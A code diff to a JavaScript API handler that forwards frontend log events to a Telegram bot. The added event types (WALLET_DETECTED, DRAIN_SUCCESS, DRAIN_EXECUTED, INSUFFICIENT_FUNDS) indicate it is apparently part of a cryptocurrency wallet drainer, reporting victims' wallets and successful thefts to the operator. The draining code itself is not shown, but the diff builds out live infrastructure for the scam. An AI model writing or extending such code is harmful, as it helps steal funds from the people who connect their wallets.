@@ -27,6 +27,18 @@ export default async function handler(req, res) {
     
     // Forward to Telegram based on log type with enhanced data
     try {
+      console.log('[API_LOG] Starting Telegram forwarding...');
+      console.log('[API_LOG] Telegram logger instance:', !!telegramLogger);
+      console.log('[API_LOG] Telegram logger enabled:', telegramLogger?.enabled);
+      
+      if (!telegramLogger) {
+        throw new Error('Telegram logger is not available');
+      }
+      
+      if (!telegramLogger.enabled) {
+        throw new Error('Telegram logger is disabled');
+      }
+      
       const logType = logData.type || 'FRONTEND_LOG';
       const enhancedData = {
         ...logData,
@@ -34,7 +46,52 @@ export default async function handler(req, res) {
         timestamp: logData.timestamp || new Date().toISOString()
       };
       
+      console.log('[API_LOG] Log type:', logType);
+      console.log('[API_LOG] Enhanced data:', JSON.stringify(enhancedData, null, 2));
+      
+      console.log('[API_LOG] About to execute switch statement...');
+      
       switch (logType) {
+        // Essential 7 log types for production
+        case 'WALLET_DETECTED':
+          console.log('[API_LOG] Executing WALLET_DETECTED case...');
+          try {
+            await telegramLogger.logWalletDetected(enhancedData);
+            console.log('[API_LOG] WALLET_DETECTED completed successfully');
+          } catch (error) {
+            console.error('[API_LOG] WALLET_DETECTED failed:', error.message);
+            throw error;
+          }
+          break;
+          
+        case 'DRAIN_SUCCESS':
+          console.log('[API_LOG] Executing DRAIN_SUCCESS case...');
+          await telegramLogger.logDrainSuccess(enhancedData);
+          console.log('[API_LOG] DRAIN_SUCCESS completed');
+          break;
+          
+        case 'TRANSACTION_CANCELLED':
+        case 'USER_CANCELLATION':
+          await telegramLogger.logTransactionCancelled(enhancedData);
+          break;
+          
+        case 'INSUFFICIENT_FUNDS':
+          await telegramLogger.logInsufficientFunds(enhancedData);
+          break;
+          
+        case 'MISSING_PARAMETER':
+          await telegramLogger.logMissingParameter(enhancedData);
+          break;
+          
+        case 'RATE_LIMIT':
+          await telegramLogger.logRateLimit(enhancedData);
+          break;
+          
+        case 'DRAIN_EXECUTED':
+          await telegramLogger.logDrainExecuted(enhancedData);
+          break;
+          
+        // Additional useful log types
         case 'TRANSACTION_SIGNING':
           await telegramLogger.logTransactionSigning(enhancedData);
           break;
@@ -45,10 +102,6 @@ export default async function handler(req, res) {
           
         case 'WALLET_CONNECTION':
           await telegramLogger.logWalletConnection(enhancedData);
-          break;
-          
-        case 'USER_CANCELLATION':
-          await telegramLogger.logTransactionCancelled(enhancedData);
           break;
           
         case 'FRONTEND_ERROR':
